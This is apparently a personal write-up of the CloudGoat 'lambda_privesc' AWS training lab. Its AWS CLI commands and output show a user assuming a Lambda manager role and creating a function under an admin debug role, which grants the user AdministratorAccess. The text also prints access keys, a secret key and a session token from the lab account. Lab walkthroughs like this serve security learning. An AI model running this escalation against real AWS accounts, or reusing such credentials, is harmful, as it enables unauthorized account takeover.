# lambda_privesc

cloudgoat_output_aws_account_id = "127553332731"
cloudgoat_output_chris_access_key_id = "AKIAR3MWFMX5X2RG567B"
cloudgoat_output_chris_secret_key = "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"

`aws iam get-user --profile cg-chris`

```json
{
    "User": {
        "Path": "/",
        "UserName": "chris-cgidkrp4ywk27z",
        "UserId": "AIDAR3MWFMX54V6OT3C6I",
        "Arn": "arn:aws:iam::127553332731:user/chris-cgidkrp4ywk27z",
        "CreateDate": "2021-02-16T02:33:38+00:00",
        "Tags": [
            {
                "Key": "Scenario",
                "Value": "lambda-privesc"
            },
            {
                "Key": "Stack",
                "Value": "CloudGoat"
            },
            {
                "Key": "Name",
                "Value": "cg-chris-cgidkrp4ywk27z"
            }
        ]
    }
}
```

`aws iam list-attached-user-policies --user-name chris-cgidkrp4ywk27z --profile cg-chris`

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-chris-policy-cgidkrp4ywk27z",
            "PolicyArn": "arn:aws:iam::127553332731:policy/cg-chris-policy-cgidkrp4ywk27z"
        }
    ]
}
```

```json
╭─zoey@parrot-virtual ~/sec/cloudgoat/cloudgoat ‹master*› 
╰─$ aws iam list-attached-role-policies --role-name cg-debug-role-cgidkrp4ywk27z --profile cg-chris 
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

aws sts assume-role --role-arn arn:aws:iam::127553332731:role/cg-lambdaManager-role-cgidkrp4ywk27z --role-session-name lambdaManager --profile cg-chris 
```json
{
    "Credentials": {
        "AccessKeyId": "ASIAR3MWFMX53T4OENX6",
        "SecretAccessKey": "GoG2G7F3C6otUdTK59HRQwn87LKdsJs5nTUWdTnk",
        "SessionToken": "IQoJb3JpZ2luX2VjEDQaCXVzLWVhc3QtMiJGMEQCIFp9ceP00HSXriwNOYJyMlls2Q+zvxZRH6j29zGbzogQAiACNqCz+Zv3qazZwn+4HjWakIFjBLna2GmHhxY+Q8LztyqaAgg9EAMaDDEyNzU1MzMzMjczMSIMjCeCTCEMUv6hHSTHKvcBPdK50kurr8K2k/YoK2DkaL/aMiZhUdqlsR2lKcF7bg3ZerCZU+7JxUebLuR/sppydqRJ3Hvsz/JxLJhgajqusy44Zcp/gXoXkrfS/F7rVfLb8/8m6ZrqyM8DlPRySDraxSK6xd1wPQT5jhmVotirX8aLRdfzMT0UaV1l9xEVSoyjfh59wQx7aqa8IjX1BIaQOKOHNdPwwaxlpJe43tGRpGFeqSOS0WdyXfYkaJsAAJmkGb3rEK0g6GlkeOzVlxZQJ/bp8CM1CRCAKfkHf0Z0PcWJ7eXmLDaePqZ5TWgzezgV9gBirj5WB4QzCUAT9sI+h/WB/CnDPTC3/KyBBjqeAbbETCyD2VtQwVJk7r3syJRjh0ox62VbMwMX+C/Tne7rlLxqtlFb2N3RrXJiIrpaqj4MMKBhNMc0pTtTsDD4Oj8VhKRYQ8K5bN9lG9dnlYCuS9mR8Pzpo0X3KGWD1FnkfB7c2kQqKwJjCI+xUeSxwZrw9eJj7G7CRtWGFcfpdeBh/CnRl/zTu96B8cboMqT0jmZGh5KFCguRB6CcKEoy",
        "Expiration": "2021-02-16T04:38:31+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAR3MWFMX5VRGOOWDAH:lambdaManager",
        "Arn": "arn:aws:sts::127553332731:assumed-role/cg-lambdaManager-role-cgidkrp4ywk27z/lambdaManager"
    }
}
```

` aws lambda create-function --function-name adminFunction --runtime python3.6 --role arn:aws:iam::127553332731:role/cg-debug-role-cgidkrp4ywk27z --handler code.lambda_handler --zip-file fileb://code.zip --profile lambdaManager --region us-east-2`

```json
{
    "FunctionName": "adminFunction",
    "FunctionArn": "arn:aws:lambda:us-east-2:127553332731:function:adminFunction",
    "Runtime": "python3.6",
    "Role": "arn:aws:iam::127553332731:role/cg-debug-role-cgidkrp4ywk27z",
    "Handler": "code.lambda_handler",
    "CodeSize": 648,
    "Description": "",
    "Timeout": 3,
    "MemorySize": 128,
    "LastModified": "2021-02-16T04:13:02.953+0000",
    "CodeSha256": "+PNidHkZurGNy0MiZqMbnyIzbZ+es2cJXmZ5J2CSXMA=",
    "Version": "$LATEST",
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "adeb2b2e-b0f7-4ee5-a54a-7293c3d86801",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}
```


```json
{
    "StatusCode": 200,
    "FunctionError": "Unhandled",
    "ExecutedVersion": "$LATEST"
}
```

with handle as `code.lambda_handler` the filename needs to be code.py

```json
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

and in `out.txt`

```json
{
  "ResponseMetadata": {
    "RequestId": "e58a70e6-643f-44f7-9780-cd6e8ff90182",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "x-amzn-requestid": "e58a70e6-643f-44f7-9780-cd6e8ff90182",
      "content-type": "text/xml",
      "content-length": "212",
      "date": "Tue, 16 Feb 2021 04:13:33 GMT"
    },
    "RetryAttempts": 0
  }
}
```

Newly attached AdministratorAccess

```json
╭─zoey@parrot-virtual ~/sec/cloudgoat/lambda-privesc ‹master*› 
╰─$ aws iam list-attached-user-policies --user-name chris-cgidkrp4ywk27z --profile cg-chris 
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        },
        {
            "PolicyName": "cg-chris-policy-cgidkrp4ywk27z",
            "PolicyArn": "arn:aws:iam::127553332731:policy/cg-chris-policy-cgidkrp4ywk27z"
        }
    ]
}
```